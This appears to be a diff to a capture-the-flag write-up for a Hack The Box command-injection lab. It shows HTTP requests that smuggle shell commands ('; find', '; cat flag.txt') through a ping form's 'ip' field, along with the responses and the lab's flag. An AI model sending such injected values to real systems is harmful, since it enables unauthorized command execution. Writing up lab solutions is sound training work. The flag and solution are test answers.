@@ -141,7 +141,7 @@ and then i found a solution here in the HTB forum of this lab (https://forum.hac
 so what we do is :
 ==ip= 1  ; find /* -name flag.txt==
 
- ( ; find /* -name flag.txt ) what this command does is find all files named "flag.txt"  in all the available paths and directories
+ (  ; find /* -name flag.txt ) what this command does is find all files named "flag.txt"  in all the available paths and directories
 
 request
 ```
@@ -161,7 +161,6 @@ Connection: keep-alive
 
 ip= 1  ; find /* -name flag.txt
 ```
-
 response
 ```
 /flag.txt
@@ -169,4 +168,40 @@ response
 
 ```
 
+so there are 2  "flag.txt" ,  /var/www/html/flag.txt(we already found this), next one  "/flag.txt" is the correct one and we found it
+
+Now
 just cat   "/flag.txt"
+
+request 
+```
+POST /ping HTTP/1.1
+Host: 94.237.52.55:51013
+Content-Length: 28
+Cache-Control: max-age=0
+Origin: http://94.237.52.55:51013
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://94.237.52.55:51013/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+ip= 1  ; cd / ; cat flag.txt
+```
+response
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Date: Tue, 01 Apr 2025 19:10:17 GMT
+Connection: keep-alive
+Content-Length: 32
+
+HTB{qu1ckly_r3p3471n6_r3qu3575}
+
+```
+
+
+hence solution is:-  ==HTB{qu1ckly_r3p3471n6_r3qu3575}==
